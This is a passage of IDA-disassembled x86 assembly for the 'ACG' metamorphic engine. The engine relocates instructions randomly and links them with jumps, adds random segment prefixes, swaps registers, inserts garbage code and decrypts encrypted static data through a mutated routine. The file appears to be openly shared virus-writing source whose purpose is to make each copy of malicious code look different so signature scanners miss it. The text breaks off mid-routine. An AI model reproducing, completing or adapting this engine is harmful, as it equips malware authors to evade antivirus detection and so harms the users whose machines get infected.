
ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ[ACG.ASM]ФФФ
;This is the metamorphic engine. As you can see, it's disassembled with IDA,
;I hope it doesn't look so ugly as it seems  :-)

;When this routine is unpacked, "ACG_Start" label takes control, which does
;all the mutation stuff. See documentation in ACG compiler package for the
;meaning of some "pcodes" i have commented.

; ЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭ

; Segment type:	Regular
seg000 segment byte public '' use16
   assume cs:seg000
   assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing

   ;EntryPoint ===> ACG_Start

   org 0000h

D_GETSD	dw ?

D_SREG dw ?

   org 0040h

D_STSD dd ?
D_CODESEG dw ?
D_CODEMAPSEG dw	?
D_WPSEG	dw ?
D_CODESIZE dw ?
D_CODEBASE dw ?
D_RNDINIT dd ?
D_CS_I dw ?
D_CS_V dw ?
D_SEL_DWORD dd ?

   org 0060h

D_ERRCODE dw ?
D_USED_BYTES dw	?

   org 0080h

D_RET dd ?
D_BYTE dw ?

   org 0100h

off_0_100 dw offset ACG_End - offset ACG_Start

; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


;===> ENTRYPOINT <===

ACG_Start proc far
   mov	word ptr cs:Old_SS_SP, sp ; save SS:SP
   mov	word ptr cs:Old_SS_SP+2, ss
   push	cs
   pop	ss
   assume ss:seg000
   mov	sp, 4000h	 ; set top of stack
   push	cs
   pop	ds		 ; CS =	DS
   assume ds:seg000
   push	fs
   push	es
   push	gs
   mov  gs, D_WPSEG      ; GS = CS + 0x0C00
   mov	fs, D_CODEMAPSEG ; FS =	CS + 0x0800
   mov	es, D_CODESEG	 ; ES =	CS + 0x0400
   call	_getRND_in_DX
   shr	dx, 1
   mov	D_CS_V,	dx
   call	_getRND_in_DX
   mov	D_CS_I,	dx
   call	ACG_Mutate	 ; *
   cmp	D_ERRCODE, 1
   jnz	ACG_Exit
   shr	D_CS_V,	2	 ; codesize too	small, try again with other config
   shr	D_CS_I,	1
   call	ACG_Mutate	 ; *
   cmp	D_ERRCODE, 1
   jnz	ACG_Exit
   shr	D_CS_V,	2
   shr	D_CS_I,	1
   call	ACG_Mutate	 ; *
   cmp	D_ERRCODE, 1
   jnz	ACG_Exit
   shr	D_CS_V,	2
   shr	D_CS_I,	2
   call	ACG_Mutate	 ; *
   cmp	D_ERRCODE, 1
   jnz	ACG_Exit
   mov	D_CS_V,	1
   mov	D_CS_I,	1
   call	ACG_Mutate	 ; *
   cmp	D_ERRCODE, 1
   jnz	ACG_Exit
   call	ACG_Mutate	 ; *
   cmp	D_ERRCODE, 1
   jnz	ACG_Exit
   call	ACG_Mutate	 ; *

ACG_Exit:
   pop	gs
   pop	es
   pop	fs
   mov	ds, cs:D_SREG
   assume ds:nothing
   lss	sp, cs:Old_SS_SP ; restore SS:SP
   assume ss:nothing
   retf
ACG_Start endp

; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
_getRND_in_EDX dw offset getRND_in_EDX
_getRND_OperandSize dw offset getRND_OperandSize
_getRND_Target dw offset getRND_Target
_getRND_in_DX dw offset	getRND_in_DX
_Get_ACGCODE_Byte dw offset Get_ACGCODE_Byte
_get_ACGCODE_Word dw offset get_ACGCODE_Word
_Check_for_SAVEFLAGS dw	offset Check_for_SAVEFLAGS
_Enough_Code_Space dw offset Enough_Code_Space
_Allocate_Code_Space dw	offset Allocate_Code_Space
_Store_Instruction_Byte	dw offset Store_Instruction_Byte
_Copy_Instruction dw offset Copy_Instruction
_Store_Instruction_Byte2 dw offset Store_Instruction_Byte2
_Generate_ModRM	dw offset Generate_ModRM
_Do_XCHG2 dw offset Do_XCHG2
_Do_Instruction2 dw offset Do_Instruction2
_Do_Instruction3 dw offset Do_Instruction3
_Do_Instruction5 dw offset Do_Instruction5
_getRegIndex dw	offset getRegIndex
_IsRegUsed dw offset IsRegUsed
_setRegUsed dw offset setRegUsed
_Choose_Register dw offset Choose_Register
_Generate_4times_Garbage dw offset Generate_4times_Garbage
_get_WPregister_BX_CL dw offset	get_WPregister_BX_CL
_convert_WorkPlace_Reg2	dw offset convert_WorkPlace_Reg2
_convert_WorkPlace_Reg dw offset convert_WorkPlace_Reg
_Discard_Used_Register2	dw offset Discard_Used_Register2
_Discard_Used_Register3	dw offset Discard_Used_Register3
_get_offset_Variable dw	offset get_offset_Variable
_Add_Needed_Prefix_66 dw offset	Add_Needed_Prefix_66
_Size_8_16 dw offset Size_8_16
_Check_Segment_Prefix dw offset	Check_Segment_Prefix
_Garbage_Check_Register	dw offset Garbage_Check_Register
_Garbage_Choose_Register dw offset Garbage_Choose_Register
Old_SS_SP dd 0
saved_SP dw 0
saveIP dw 0
   dw 0
ErrorCode dw 0

; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


CodeSizeTooSmall proc near
   mov	ds:ErrorCode, 1

loc_0_202:
   mov	ax, ds:ErrorCode
   mov	ds:D_ERRCODE, ax ; return error	code
   jmp	short $+2
   mov	sp, ds:saved_SP	 ; restore SP
   jmp	ACG_Exit2	 ; exit
CodeSizeTooSmall endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; INPUT:
;    EDX = pointer to StaticData (encrypted)
; 
; OUTPUT:
;    AL	= byte from StaticData
;    EDX = incremented pointer

Get_Byte proc near
   pushad
   push	edx
   mov	ds, cs:D_SREG
   call	dword ptr cs:D_GETSD ; call this mutated routine (in order to decrypt data)
   push	cs
   pop	ds
   assume ds:seg000
   pop	D_BYTE
   pop	D_RET
   popad
   nop
   mov	edx, D_RET
   mov	al, byte ptr D_BYTE
   retn
Get_Byte endp

; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
Segment_Selection db	0,   4,	  5,   0
Segment_Table db    0,	 4,   5,   0
   db	 4,   0,   5,	0
   db	 0,   5,   4,	0
   db	 5,   4,   0,	0
   db	 4,   5,   0,	0
   db	 5,   0,   4,	0
   db	 0,   5,   4,	0 ; repeated (to align?)
   db	 5,   4,   0,	0 ; repeated (to align?)
pACGCODE dd 0
Instruction_Offset dw 0
StaticData_ACGCODES_Pointer dd 0
StaticData_ACGCODES_Start dd 0
Procedure_WPindex dw 0
SaveFlags db 0
CSPREF dw 0
CSPREF_2 db 0
Dont_Extend_Immediate db 0
dword_0_26F dd 0
RandomWORD1 dw 0
Dont_Use_Exchange_For_MOV_operation db 0
Instruction db 60h dup(	  0)
Instruction_Size dw 0
Used_AX	dw 0
Used_CX	dw 0
Used_DX	dw 0
Used_BX	dw 0
Used_SP	dw 0
Used_BP	dw 0
Used_SI	dw 0
Used_DI	dw 0
Size_AX	dw 0
Size_CX	dw 0
Size_DX	dw 0
Size_BX	dw 0
Size_SP	dw 0
Size_BP	dw 0
Size_SI	dw 0
Size_DI	dw 0
Free_AX dw 0
Free_CX	dw 0
Free_DX	dw 0
Free_BX	dw 0
Free_SP	dw 0
Free_BP	dw 0
Free_SI	dw 0
Free_DI	dw 0
Force_Memory_Instead_of_Register db 0
Force_Register_Instead_of_Memory db 0
Garbage_Level db 0
Operand_Ampersand dd 0
DecryptType0 db	   0,	0,   0,	  0,   0
DecryptType1 db	   0,	0,   0,	  0,   0
DecryptType2 db	   0,	0,   0,	  0,   0
DecryptType3 db	   0,	0,   0,	  0,   0
DecryptType4 db	   0,	0,   0,	  0,   0
DecryptType5 db	   0,	0,   0,	  0,   0
DecryptType6 db	   0,	0,   0,	  0,   0
DecryptType7 db	   0,	0,   0,	  0,   0
DecryptType8 db	   0,	0,   0,	  0,   0
DecryptType9 db	   0,	0,   0,	  0,   0
DecryptTypeA db	   0,	0,   0,	  0,   0
DecryptTypeB db	   0,	0,   0,	  0,   0
DecryptTypeEnd db 0
InitialDecryptState dd 0
byte_0_350 db 0
DecryptOperation db 0
byte_0_352 db 0
byte_0_353 db 0
DecryptOffset db 0
StaticData_ACGCODES_Pointer_Increment dd 0
Memory_Segment_Register	db 0
Mutation_Level db 0
Return_Offset dw 0

; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; OUTPUT:
;    EDX = 32-bit random number

getRND_in_EDX proc near
   call	_getRND_in_DX
   shl	edx, 10h
getRND_in_EDX endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; OUTPUT:
;    DX	= 16-bit random	number

getRND_in_DX proc near
   push	ax
   mov	ax, word ptr D_RNDINIT
   call	getRND
   mov	word ptr D_RNDINIT, ax
   push	ax
   mov	ax, word ptr D_RNDINIT+2

getRND_Again:
   call	getRND
   mov	word ptr D_RNDINIT+2, ax
   or	ax, ax
   jz	getRND_Again
   pop	dx
   add	dx, ax
   adc	dx, 0
   xor	dx, ax
   pop	ax
   retn
getRND_in_DX endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


getRND proc near
   mov	dx, 4Bh
   mul	dx
   add	ax, 4Bh
   adc	dx, 0
   sub	ax, dx
   adc	ax, 0FFFFh
   retn
getRND endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; OUTPUT:
;    AL	= byte from ACGCODES
; 
; CHANGES:
;    pACGCODE

Get_ACGCODE_Byte proc near
   push	edx
   push	es
   mov	es, D_CODESEG
   push	fs
   mov	fs, D_CODEMAPSEG
   push	gs
   mov	gs, D_WPSEG
   mov	edx, pACGCODE
   call	Get_Byte
   mov	pACGCODE, edx
   test	byte ptr D_SEL_DWORD, 1
   jnz	loc_0_3C2
   call	Encrypt_Store_ACGCODE_Byte

loc_0_3C2:
   pop	gs
   pop	fs
   pop	es
   pop	edx
   retn
Get_ACGCODE_Byte endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; OUTPUT:
;    AX	= word from ACGCODES
; 
; CHANGES:
;    pACGCODE

get_ACGCODE_Word proc near
   call	_Get_ACGCODE_Byte
   mov	ah, al
   call	_Get_ACGCODE_Byte
   xchg	ah, al
   retn
get_ACGCODE_Word endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; OUTPUT:
;    AL	= byte from ACGCODES

Look_ACGCODE_Byte proc near
   push	edx
   mov	edx, pACGCODE
   call	Get_Byte	 ; get byte but	dont modify ACGCODE pointer
   pop	edx
   retn
Look_ACGCODE_Byte endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Check_for_SAVEFLAGS proc near
   push	ax
   call	Look_ACGCODE_Byte
   cmp	al, 20h		 ; is next ACGCODE = SAVEFLAGS?
   jnz	loc_0_3F1	 ; no
   or	SaveFlags, 1	 ; preserve cpu	flags
			 ; (dont asign a "1", because it may be	already	0xFF)

loc_0_3F1:
   pop	ax
   retn
Check_for_SAVEFLAGS endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; INPUT:
;    CX	= number of bytes
;    DX	= IP offset
; 
; OUTPUT:
;    AL	= 0 -->	enough space

Enough_Code_Space proc near
   push	bx
   push	di
   mov	bx, dx
   add	bx, cx
   jb	Not_Enough_Space ; overflow
   cmp	bx, D_CODESIZE
   ja	Not_Enough_Space ; outside range of memory
   mov	di, dx
   cmp	cx, 4
   jz	loc_0_426	 ; fast	check for 4 bytes
   cmp	cx, 8
   jz	loc_0_41E	 ; fast	check for 8 bytes
   mov	bx, cx

loc_0_40F:
   cmp	byte ptr fs:[bx+di-1], 0
   jnz	Not_Enough_Space
   dec	bx
   jnz	loc_0_40F	 ; check next byte

loc_0_419:		 ; we have found free space
   mov	al, 0
   pop	di
   pop	bx
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_41E:
   cmp	dword ptr fs:[di+4], 0
   jnz	Not_Enough_Space

loc_0_426:
   cmp	dword ptr fs:[di], 0
   jz	loc_0_419

Not_Enough_Space:
   mov	al, 1
   pop	di
   pop	bx
   retn
Enough_Code_Space endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; INPUT:
;    CX	= number of bytes
; 
; OUTPUT:
;    DX	= IP offset

Allocate_Code_Space proc near
   push	ax
   push	di
   push	cx
   mov	di, 100h	 ; used	to avoid endless loops

loc_0_438:		 ; get random offset
   call	_getRND_in_DX
   call	_Enough_Code_Space
   cmp	al, 0
   jz	loc_0_49F	 ; jump	if found enough	space
   dec	di
   jnz	loc_0_438
   call	_getRND_in_DX	 ; get random offset

loc_0_44B:
   mov	cx, D_CODESIZE
   sub	cx, dx
   jnb	loc_0_46A
   bsr	cx, D_CODESIZE	 ; calculate number of bits of maximum offset
   jz	CodeSizeTooSmall
   xchg	ax, cx		 ; CX =	number of bits - 1
   mov	cx, 10h
   sub	cx, ax
   call	_getRND_in_DX
   shr	dx, cl		 ; get another random offset inside range
   jmp	short loc_0_44B
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_46A:
   mov	di, dx

loc_0_46C:
   mov	al, 0
   push	es
   push	fs
   pop	es
   repne scasb		 ; search for a	free space
   pop	es
   jnz	loc_0_495
   dec	di
   inc	cx
   xchg	di, dx		 ; DX =	offset of that free space
   xchg	ax, cx
   pop	cx
   push	cx		 ; CX =	number of needed free bytes
   push	ax		 ; save	CX for a next search in	case this hole is too small
   call	_Enough_Code_Space
   cmp	al, 0
   pop	cx
   xchg	di, dx
   jz	loc_0_4B8	 ; jump	if this	hole is	large enough
   mov	al, 0
   push	es
   push	fs
   pop	es
   repe	scasb		 ; skip	this small hole
   pop	es
   jnz	loc_0_46C	 ; search next free hole

loc_0_495:
   or	dx, dx
   jz	CodeSizeTooSmall
   xor	dx, dx
   jmp	short loc_0_44B	 ; try with offset zero
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_49F:
   mov	di, dx
   mov	cx, dx
   cmp	cx, 40h
   jb	loc_0_4AB
   mov	cx, 40h		 ; search for 40h free bytes before DX offset

loc_0_4AB:
   std
   mov	al, 0
   push	es
   push	fs
   pop	es
   repe	scasb		 ; search backwards for	more zeros
   pop	es
   cld
   inc	di
   inc	di

loc_0_4B8:
   mov	dx, di
   pop	cx
   push	cx

loc_0_4BC:		 ; mark	space as used
   mov	byte ptr fs:[di], 1
   inc	di
   loop	loc_0_4BC
   pop	cx
   pop	di
   pop	ax
   retn
Allocate_Code_Space endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Mark_Space_Used	proc near
   push	ax
   push	di
   push	cx
   mov	di, dx
   jmp	short loc_0_4B8
Mark_Space_Used	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Create_Jump_to_Next_Instruction	proc near
   push	di
   push	dx
   push	cx
   mov	di, Instruction_Offset
   sub	di, dx
   push	dx
   add	di, 70h
   mov	cx, 2		 ; CX =	2 = near jump
   cmp	di, 0E0h
   jnb	loc_0_4E7
   mov	cx, 1		 ; CX =	1 = short jump

loc_0_4E7:
   mov	di, Instruction_Offset
   mov	byte ptr es:[di], 0EBh ; short jump
   cmp	cl, 1
   jz	loc_0_4FA
   mov	byte ptr es:[di], 0E9h ; near jump
   jmp	short $+2

loc_0_4FA:
   inc	di
   add	di, cx
   pop	dx
   push	cx
   mov	cx, 4
   call	Mark_Space_Used	 ; mark	these 4	bytes as used
   pop	cx
   mov	Instruction_Offset, dx ; set new instruction offset
   sub	dx, di
   cmp	cl, 1
   jz	loc_0_517
   mov	es:[di-2], dx	 ; fix near jump
   jmp	short loc_0_51B
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_517:		 ; fix short jump
   mov	es:[di-1], dl

loc_0_51B:
   pop	cx
   pop	dx
   pop	di
   retn
Create_Jump_to_Next_Instruction	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Store_Instruction_Byte proc near
   push	bx
   mov	bx, Instruction_Size
   mov	Instruction[bx], al
   inc	bx
   mov	Instruction_Size, bx
   pop	bx
   retn
Store_Instruction_Byte endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Insert_Instruction_Prefix proc near
   push	ax
   push	bx
   mov	bx, Instruction_Size

loc_0_535:
   dec	bx
   or	bx, bx
   js	loc_0_544
   mov	ah, Instruction[bx]
   mov	(Instruction+1)[bx], ah	; move Instruction bytes 1 byte	forward
   jmp	short loc_0_535
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_544:		 ; insert prefix at beginning
   mov	Instruction, al
   inc	Instruction_Size
   pop	bx
   pop	ax
   retn
Insert_Instruction_Prefix endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Copy_Instruction proc near
   pusha
   mov	cx, Instruction_Size
   mov	dx, Instruction_Offset
   add	dx, 4		 ; next	4 bytes	are always reserved (for possible jump)
   call	_Enough_Code_Space
   sub	dx, 4
   cmp	al, 0
   jz	loc_0_572
   add  cx, 4            ; to reserve space for a jump
   call	_Allocate_Code_Space ; DX = target offset to continue with instruction
   sub	cx, 4
   call	Create_Jump_to_Next_Instruction

loc_0_572:
   mov	bx, dx
   xor	si, si
   push	si		 ; push	a zero

Next_Instruction_Byte:
   mov	al, Instruction[si]
   mov	es:[bx+si], al
   inc	si
   cmp	si, cx
   jb	Next_Instruction_Byte
   add	dx, 4
   call	Mark_Space_Used
   add	bx, cx
   mov	Instruction_Offset, bx
   pop	Instruction_Size ; reset size to zero
   popa
   retn
Copy_Instruction endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Store_Instruction_Byte2	proc near
   mov	saveIP,	si
   pop	si
   inc	si
   push	si
   dec	si
   push	ax
   mov	al, [si]	 ; get byte that is after CALL
   call	_Store_Instruction_Byte
   pop	ax
   mov	si, saveIP
   retn
Store_Instruction_Byte2	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Insert_Needed_Prefix_Segment proc near
   push	ax
   cmp	byte ptr CSPREF, 0
   jz	@@2		 ; no prefix needed
   cmp	Instruction_Size, 0
   jz	@@1		 ; jump	if instruction size is zero
   mov	al, Instruction	 ; check if already inserted
   cmp	al, 26h		 ; ES
   jz	@@2
   cmp	al, 2Eh		 ; CS
   jz	@@2
   cmp	al, 36h		 ; SS
   jz	@@2
   cmp	al, 3Eh		 ; DS
   jz	@@2
   cmp	al, 64h		 ; FS
   jz	@@2
   cmp	al, 65h		 ; GS
   jz	@@2

@@1:			 ; jump	if can use random prefix segment
   cmp	byte ptr CSPREF, 1
   ja	@@3
   mov	al, 2Eh		 ; CS is needed
   call	Insert_Instruction_Prefix

@@2:
   pop	ax
   retn
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

@@3:
   push	dx
   call	_getRND_in_DX
   cmp	dh, 30h
   ja	@@5		 ; do not insert any prefix segment
   mov	al, 64h
   and	dl, 1
   add	al, dl		 ; AL =	64,65
   cmp	dh, 20h
   ja	@@4
   mov	al, 26h
   and	dh, 18h
   add	al, dh		 ; AL =	26,2E,36,3E

@@4:
   call	Insert_Instruction_Prefix

@@5:
   pop	dx
   jmp	short @@2
Insert_Needed_Prefix_Segment endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл

; INPUT:
;    SI	= Reg field
;    EDI = indicated displacement

Generate_ModRM proc near
   push	dx
   push	ax
   test	edi, 0FFFF0000h	 ; memory access?
   jnz	loc_0_617
   mov	ax, di
   or	ax, 0C0h	 ; mod=3
   jmp	short loc_0_641
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_617:
   call	Insert_Needed_Prefix_Segment
   ror	edi, 10h
   mov	dx, di
   rol	edi, 10h
   mov	al, dl
   cmp	dl, 6		 ; (mod=0) && (r_m=6)
   jz	loc_0_641	 ; jump	if no memory index
   or	di, di
   jz	loc_0_641	 ; use mod=0
   push	di
   add	di, 80h
   cmp	di, 100h
   pop	di
   jnb	loc_0_63F	 ; jump	if signed offset is more than 7	bits
   or	al, 40h		 ; if (-128..+127) then	use mod=1
   jmp	short loc_0_641
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_63F:		 ; use mod=2
   or	al, 80h

loc_0_641:
   push	si
   and	si, 7
   shl	si, 3
   or	ax, si		 ; set "Reg" field
   pop	si
   call	_Store_Instruction_Byte	; store	ModRM byte
   mov	ah, al
   and	ah, 7
   shr	al, 6
   cmp	al, 2
   jz	loc_0_670	 ; mod=2 --> store word
   cmp	al, 0
   jnz	loc_0_664
   cmp	ah, 6
   jz	loc_0_670	 ; (mod=0)&&(r_m=6) -->	store word

loc_0_664:
   cmp	al, 1
   jnz	loc_0_67E	 ; mod=3 --> store nothing
   mov	ax, di		 ; AX =	8-bit sign extended offset
   call	_Store_Instruction_Byte	; mod=1	--> store byte
   jmp	short loc_0_67E
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_670:
   mov	ax, di
   call	_Store_Instruction_Byte	; store	low byte of 16-bit offset
   mov	ax, di
   mov	al, ah
   call	_Store_Instruction_Byte	; store	high byte of 16-bit offset

loc_0_67E:
   pop	ax
   pop	dx
   retn
Generate_ModRM endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Add_Needed_Prefix_66 proc near
   cmp	cl, 4
   jnz	locret_0_68B
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 66h
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

locret_0_68B:
   retn
Add_Needed_Prefix_66 endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Size_8_16 proc near
   cmp	cl, 2		 ; if 16/32 bits, add 1
   sbb	al, -1
   retn
Size_8_16 endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Create_Jump proc near
   push	ax
   push	dx
   push	si
   mov	si, Instruction_Offset
   add	si, D_CODEBASE	 ; SI =	origin offset
   sub	si, dx		 ; DX =	target offset
   add	si, 70h
   cmp	si, 0E0h
   ja	loc_0_6EC	 ; do near jump
   mov	si, dx		 ; a short jump	will be	used
   mov	dx, Instruction_Offset
   add	dx, 4
   push	cx
   mov	cx, 2

loc_0_6B5:
   call	_Enough_Code_Space
   pop	cx
   mov	dx, si
   cmp	al, 0
   jnz	loc_0_6EC
   cmp	bh, 10h
   jnz	loc_0_6CC	 ; do conditional short	jump
   call	_Store_Instruction_Byte2 ; create unconditional	short jump
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0EBh
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   jmp	short loc_0_6D4
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_6CC:
   mov	al, 70h
   add	al, bh		 ; AL =	70..7F
   call	_Store_Instruction_Byte	; create conditional short jump

loc_0_6D4:		 ; reserve byte
   call	_Store_Instruction_Byte
   call	_Copy_Instruction
   mov	si, Instruction_Offset
   sub	dx, si
   sub	dx, D_CODEBASE
   mov	es:[si-1], dl	 ; fix short jump
   jmp	short loc_0_740
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_6EC:
   cmp	bh, 10h
   jnz	loc_0_6F8	 ; do conditional near jump
   call	_Store_Instruction_Byte2 ; create unconditional	near jump
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0E9h
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   jmp	short loc_0_726
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_6F8:
   push	dx
   call	_getRND_in_DX
   cmp	dh, 40h
   pop	dx
   jnb	loc_0_719	 ; normal method
   mov	al, 70h
   add	al, bh
   xor	al, 1		 ; inverse conditional jump
   call	_Store_Instruction_Byte	; create inversion conditional short jump
   call	_Store_Instruction_Byte2 ; make	this inverse jump to skip the real jump
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 3
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   call	_Store_Instruction_Byte2 ; create unconditional	jump (that jumps where the conditional jump was	supposed to jump)
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0E9h
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   jmp	short loc_0_726
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_719:		 ; store 0F opcode
   call	_Store_Instruction_Byte2
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0Fh
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   mov	al, 80h
   add	al, bh
   call	_Store_Instruction_Byte	; store	conditional opcode (80..8F)

loc_0_726:		 ; reserve byte
   call	_Store_Instruction_Byte
   call	_Store_Instruction_Byte	; reserve byte
   call	_Copy_Instruction
   mov	si, Instruction_Offset
   sub	dx, si
   sub	dx, D_CODEBASE
   mov	es:[si-2], dx	 ; fix near jump

loc_0_740:
   pop	si
   pop	dx
   pop	ax
   retn
Create_Jump endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_CALL	proc near
   push	dx		 ; (DX = target	IP)
   push	si
   call	_Store_Instruction_Byte2 ; store Opcode	byte
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   db 0E8h		 ; opcode 0xE8
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   call	_Store_Instruction_Byte	; reserve byte
   call	_Store_Instruction_Byte	; reserve byte
   call	_Copy_Instruction
   mov	si, Instruction_Offset
   sub	dx, si
   sub	dx, D_CODEBASE
   mov	es:[si-2], dx	 ; fix call instruction
   pop	si
   pop	dx
   retn
Do_CALL	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Do_XCHG2 proc near
   push	ax
   push	edx
   push	esi
   push	edi
   call	_getRND_in_DX
   cmp	dh, 10h
   jnb	loc_0_7B1	 ; high	probability to jump

loc_0_778:
   call	_getRND_in_DX
   jns	loc_0_781
   xchg	esi, edi	 ; exchange order of operands

loc_0_781:
   push	cx
   call	getRND_Reg_Not_Index ; get random reg
   mov	dl, ch
   pop	cx
   and	edx, 7		 ; EDX = auxiliar register
   cmp	edx, esi
   jz	loc_0_7B1	 ; if same register, do	a normal XCHG
   cmp	edx, edi
   jz	loc_0_7B1	 ; if same register, do	a normal XCHG
   xchg	edx, esi
   call	Do_XCHG		 ; auxiliar <--> target
   xchg	edi, edx
   call	Do_XCHG		 ; auxiliar <--> source
   xchg	edi, edx
   call	Do_XCHG		 ; auxiliar <--> target
   jmp	short loc_0_7FB
Do_XCHG2 endp


